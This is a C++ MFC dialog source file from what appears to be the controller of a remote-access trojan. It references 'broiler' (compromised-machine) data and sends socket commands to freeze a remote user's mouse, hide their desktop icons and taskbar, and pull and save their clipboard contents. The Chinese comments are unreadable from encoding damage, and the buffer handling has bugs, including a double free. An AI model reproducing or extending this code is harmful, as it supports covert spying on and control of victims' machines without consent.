// DesktopDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "DesktopDlg.h"
#include "BroilerData.h"

// CDesktopDlg �Ի���

IMPLEMENT_DYNAMIC(CDesktopDlg, CDialog)

CDesktopDlg::CDesktopDlg(CWnd* pParent /*=NULL*/, SOCKET sock, CString strTitle)
	: CDialog(CDesktopDlg::IDD, pParent)
{
	m_socket = sock;
	m_pBuffer = NULL;
	m_strTitle = strTitle;
	m_strCilpBoard.Empty();
}

CDesktopDlg::~CDesktopDlg()
{
}

void CDesktopDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CDesktopDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_HIDE_MOUSE, &CDesktopDlg::OnBnClickedBtnHideMouse)
	ON_BN_CLICKED(IDC_BTN_ALLOW_MOUSE, &CDesktopDlg::OnBnClickedBtnAllowMouse)
	ON_BN_CLICKED(IDC_BTN_HIDE_DESKTOP, &CDesktopDlg::OnBnClickedBtnHideDesktop)
	ON_BN_CLICKED(IDC_BTN_SHOW_DESKTOP, &CDesktopDlg::OnBnClickedBtnShowDesktop)
	ON_BN_CLICKED(IDC_BTN_HIDE_TASKBAR, &CDesktopDlg::OnBnClickedBtnHideTaskbar)
	ON_BN_CLICKED(IDC_BTN_SHOW_TASKBAR, &CDesktopDlg::OnBnClickedBtnShowTaskbar)
	ON_BN_CLICKED(IDC_BTN_VIEW_CLIP, &CDesktopDlg::OnBnClickedBtnViewClip)
	ON_BN_CLICKED(IDC_BTN_SAVE_CLIP, &CDesktopDlg::OnBnClickedBtnSaveClip)
END_MESSAGE_MAP()


// CDesktopDlg ��Ϣ�������
BOOL CDesktopDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CDesktopDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(AfxGetApp()->LoadIcon(IDI_ICON_DESKTOP), TRUE);
	m_strTitle = _T("\\\\") + m_strTitle;
	m_strTitle += _T(" �������");
	SetWindowText(m_strTitle);
	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CDesktopDlg::OnBnClickedBtnHideMouse()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = MOUSE_MOVE;
	tagDesktopInfo.bTag = false;  //��ֹ����ƶ�
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnAllowMouse()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = MOUSE_MOVE;
	tagDesktopInfo.bTag = true;  //��������ƶ�
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnHideDesktop()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = DESKTOP_ICON;
	tagDesktopInfo.bTag = true;  //��������
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnShowDesktop()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = DESKTOP_ICON;
	tagDesktopInfo.bTag = false;  //��ʾ����
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnHideTaskbar()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = TASKBAR;
	tagDesktopInfo.bTag = true;  //����������
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::OnBnClickedBtnShowTaskbar()
{
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = TASKBAR;
	tagDesktopInfo.bTag = false;  //��ʾ������
	SendCommandMsg(tagDesktopInfo);
}

//�鿴����������
void CDesktopDlg::OnBnClickedBtnViewClip()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	DESKTOPINFO_C tagDesktopInfo;
	memset(&tagDesktopInfo, 0, sizeof(DESKTOPINFO_C));
	tagDesktopInfo.nType = CLIPBOARD;
	tagDesktopInfo.bTag = true;
	SendCommandMsg(tagDesktopInfo);
}

void CDesktopDlg::SendCommandMsg(IN const DESKTOPINFO_C tagDesktopInfo)
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_DESKTOP;
	memcpy((char*)tagMsgInfo.context, (char*)&tagDesktopInfo, sizeof(DESKTOPINFO_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

DWORD CDesktopDlg::SetClipBoardContext(IN const CLIPBOARD_C tagClipBoard)
{
	switch (tagClipBoard.id)
	{
	case 0:   //ͷ��Ϣ
		{
			m_pBuffer = new char[tagClipBoard.dwSize + 1];  //����ռ�
			memset(m_pBuffer, 0, tagClipBoard.dwSize + 1);
		}
		break;
	case 1:  //������С���ݿ�
		{
			//��������
			for(int i= tagClipBoard.Begin, j = 0 ; j < AUDIO_BUF_SIZE; i++, j++)
			{
				m_pBuffer[i] = tagClipBoard.Data[j];
			}
		}
		break;
	case 2:  //���һ�θ�������
		{
			for(int i= tagClipBoard.Begin, j=0; i < tagClipBoard.dwSize; i++,j++)
			{
				m_pBuffer[i] = tagClipBoard.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("δ֪�ļ���������ID"),_T("��ʾ"),MB_OK);
			delete[] m_pBuffer;
			LocalFree(m_pBuffer);
			return 1;
		}
	}
	if (tagClipBoard.bRead)
	{
		CStringA strContent = "";
		strContent.Format("%s", m_pBuffer);
		m_strCilpBoard.Empty();
		m_strCilpBoard = CStrA2CStrW(strContent);
		GetDlgItem(IDC_EDIT_CLIPBOARD)->SetWindowText(m_strCilpBoard);
		delete[] m_pBuffer;
	}
	return 0;
}

void CDesktopDlg::OnBnClickedBtnSaveClip()
{
	CString strFileName = _T("���а���Ϣ");
	CTime time = CTime::GetCurrentTime();  //�Ե�ǰʱ������
	CString strTime = time.Format(_T("%Y-%m-%d %H-%M-%S"));
	strFileName += strTime;
	strFileName += _T(".txt");

	CFileDialog cdOpenFile(FALSE,  //����һ��CfileDialog����
		                   _T(""),
		                   strFileName,
		                   OFN_FILEMUSTEXIST |OFN_HIDEREADONLY,
		                   _T("�ļ�����(*.txt)|*.txt||"),
		                   NULL);//����һ���Ի���

	if(cdOpenFile.DoModal() == IDOK)//�������Ի���ȷ����ť
	{
		CString strFilePathName = _T("");
		strFilePathName = cdOpenFile.GetPathName();//�õ����ļ���·��
		//������������ݵ����±���
		HANDLE hFile = CreateFile(strFilePathName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (INVALID_HANDLE_VALUE == hFile)
		{
			::MessageBox(this->m_hWnd, _T("�ļ���������ȡʧ��!\n"), _T("��ʾ"), MB_ICONWARNING|MB_OK);
		}
		else
		{
			CFile fDestFile(hFile);

			//��Ϊ���̻�����Unicode�����ڸû�����д�룬Ӧ�ü����ļ�ͷ���������롣
			unsigned short int feff = 0xfeff;   
			fDestFile.Write(&feff,sizeof(short int));
			//��ʽд�ļ���ע������ΪʲôҪ ���� sizeof(TCHAR)�����˾ͻ�д�벻��ȫ��ԭ����̽��
			try
			{
				fDestFile.Write(m_strCilpBoard.GetBuffer(0), m_strCilpBoard.GetLength() * sizeof(TCHAR));
				::MessageBox(this->m_hWnd, _T("�ļ�����ɹ�!\n"), _T("��ʾ"), MB_OK);
			}
			catch (CFileException)
			{
				::MessageBox(this->m_hWnd, _T("�ļ�д��ʧ��!\n"), _T("��ʾ"), MB_ICONWARNING|MB_OK);
			}
			fDestFile.Flush();
			fDestFile.Close();  //�ر��ļ����
			m_strCilpBoard.ReleaseBuffer();
		}
	}
}

//
// CStringAתCStringW  Unicode������
//
CStringW CDesktopDlg::CStrA2CStrW(const CStringA &cstrSrcA)
{
	int len = MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, NULL, 0);
	wchar_t *wstr = new wchar_t[len];
	memset(wstr, 0, len*sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, LPCSTR(cstrSrcA), -1, wstr, len);
	CStringW cstrDestW = wstr;
	delete[] wstr;
	return cstrDestW;
}

void CDesktopDlg::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	DestroyWindow();
	delete this;
}

void CDesktopDlg::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pDesktopDlg = NULL;
}
